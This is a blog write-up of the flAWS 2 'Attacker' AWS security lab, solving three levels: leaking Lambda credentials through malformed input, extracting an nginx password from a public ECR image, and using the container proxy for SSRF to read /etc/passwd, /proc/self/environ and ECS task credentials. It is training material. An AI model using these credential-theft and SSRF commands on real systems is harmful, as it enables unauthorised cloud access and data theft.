---
title: flAWS 2 - Attacker
date: 2023-05-12 23:42:00 -0600
categories: [Lab Practice Notes, AWS Labs]
tags: [aws,lab,flaws2,security]
image:
  path: /assets/img/covers/flaws-cover.jpeg
  alt: flAWS Artwork
---

## Level 1

> The problem statement is to enter a correct pin code on a website that is 100 digits long.
{: .prompt-info }

The first thing to do is to look at the HTML source, where the form that takes the input submits to the following API Gateway URL &rarr;

```
https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
```

The source also has a JS construct with the following &rarr;

```html
<script type="text/javascript">
    function validateForm() {
        var code = document.forms["myForm"]["code"].value;
        if (!(!isNaN(parseFloat(code)) && isFinite(code))) {
            alert("Code must be a number");
            return false;
        }
    }
</script>
```

Since the client-side validation code expects it to be a finite number, we can try bypassing that control and sending a string instead. We can do this using cURL. Doing so results in a malformed input error and spits out environment variables, likely due to developer errors, for the Lambda function handling the request. The returned environment JSON object can be pretty printed as follows &rarr;

```bash
curl "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=qwer" | grep -v "Error, malformed input" | jq
```

We can explore the AWS environment using these session credentials. We can verify credentials as follows &rarr;

```bash
AWS_ACCESS_KEY_ID="ASIAZ...." AWS_SECRET_ACCESS_KEY="DEZBc...." AWS_SESSION_TOKEN="IQoJb3JpZ2luX2V...." aws sts get-caller-identity
```

which returns &rarr;

```json
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

We can export the variables to the shell to make it easier.

Like flAWS-1, likely, the website is statically hosted via S3, so that should be the first exploration point. We can perform the following sequence of commands to explore S3 and find the next level &rarr;

```bash
aws s3 ls # denied
aws s3 ls s3://level1.flaws2.cloud # allowed and shows a secret file
# download the secret file
aws s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html ./
```

The secret file contains the URL for the next level &rarr;

```
http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
```

---

## Level 2

> Problem statement says that the level challenge is running as a container at URL http://container.target.flaws2.cloud/, and the associated ECR registry/repository name is "level2".
{: .prompt-info }

The website in the container requests a login before returning any markup source. So, the only other available information is the ECR registry/repository name. With some thought, it has to be the repository name. It is also likely that the registry is publicly accessible, in which case we should be able to look at the image to figure out what web service is running and possibly look at credentials. We can also assume that the account is the same as what we discovered in level 1. So, we can also use the same CLI credentials.

First, check the access to the repository by listing all images as follows &rarr;

```bash
aws ecr list-images --repository-name level2 --registry-id 653711331788
```

which returns &rarr;

```json
{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```

There's only one image, likely the one that's running the website, so we can list all layers of the image and pull them one by one to construct the container file system locally as follows &rarr;

```bash
aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids "imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"
```

This gives a list of digests referring and relating to gzipped tarballs of image layers for the above image. We can retrieve each layer by using the `get-download-url-for-layer` sub-command. For multiple layers, let's automate that with a quick for-loop &rarr;

```bash
mkdir image; cd image
for i in $(awsn ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids "imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e" | jq -r '.images[0].imageManifest | fromjson | .layers[].digest')
do
    echo $i
    wget $(awsn ecr get-download-url-for-layer --registry-id 653711331788 --repository-name level2 --layer-digest "$i" | jq -r '.downloadUrl') -O test
    tar -xzf test
done
cd ..
```

This creates the complete filesystem for the image. Since it's a website, we can search for common web server applications like Apache or Nginx and password or credential files. I used `fdfind` for that, and a hit and try on the following led me to the `.htpasswd` file for Nginx &rarr;

```bash
fdfind apache . -H
fdfind nginx . -H
la ./etc/nginx
bat ./etc/nginx/.htpasswd
```

The last command gave the following &rarr;

```
flaws2:$apr1$jJh7fsij$wJV.a0WR6hAZ51/r11myl/
```

This is likely crackable but maybe not too. It's better to turn to another method to obtain instructions per layer for the image. One way to do that is to use Docker to log in with the AWS credentials and use `docker inspect` on the pulled image. To log in to Docker with the AWS credentials, do the following &rarr;

```bash
aws ecr get-login-password # spits off a token; export it as TOKEN
docker login -u AWS -p $TOKEN 653711331788.dkr.ecr.us-east-1.amazonaws.com
```

Then, pull the image and look at its interpreted command history as follows &rarr;

```bash
docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
docker history 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 --no-trunc | grep htpasswd
```

One of the commands there sets the `.htpasswd` as follows (which also gives us the password) &rarr;

```bash
htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
```

Using these credentials in the containerized website gives the next level's URL as &rarr;

```
http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
```

---

## Level 3

> The problem statement tells us that the container also has a simple proxy service running within and gives two examples to visit the fLAWS-1 URL and neverssl.com.
{: .prompt-info }

The first impulse is to try the IMDSv1 endpoint in case the container was running within an EC2 instance. However, that didn't produce any results. Looking at the image filesystem from the previous level, we can try to find the proxy code using `fdfind proxy . -H`, which shows a file available at `./var/www/html/proxy.py`. The proxy script takes the path and removes the leading `/`, and queries everything else as a URL.

Next, it's likely the container is running as an ECS task. AWS [states](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html) that ECS tasks can have credentials that are retrievable from inside the container with &rarr;

```bash
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

Of course, this won't directly work since the environment variable isn't retrievable inside the Python code using the `$` denotation. So, we can try to retrieve that variable by other means. Trying another scheme like `file://` seems to work for the following payload &rarr;

```bash
curl http://container.target.flaws2.cloud/proxy/file:///etc/passwd
```

Process environment variables can be listed via `/proc/<PID>/environ`, and we can try passing in `self` for the PID. The command would then look like &rarr;

```bash
curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ --output -
```

This gives the result as &rarr;

```
HOSTNAME=ip-172-31-75-168.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207fAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/9d3f98af337e441985892fa63d737081-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/9d3f98af337e441985892fa63d737081-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/9d3f98af337e441985892fa63d737081-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
```

With that information in hand, we can retrieve the credentials as follows &rarr;

```bash
curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207f | jq
```

With those credentials, we get access to the following role &rarr;

```json
{
    "UserId": "AROAJQMBDNUMIKLZKMF64:9d3f98af337e441985892fa63d737081",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/9d3f98af337e441985892fa63d737081"
}
```

From here, enumeration seems like a shot in the dark 🤔. Knowing the track record of past solutions, S3 should be the first stop due to static hosting. We can now list all buckets, and there is a "The End" bucket, i.e., the lab is complete.

Final page &rarr;

```
the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

---
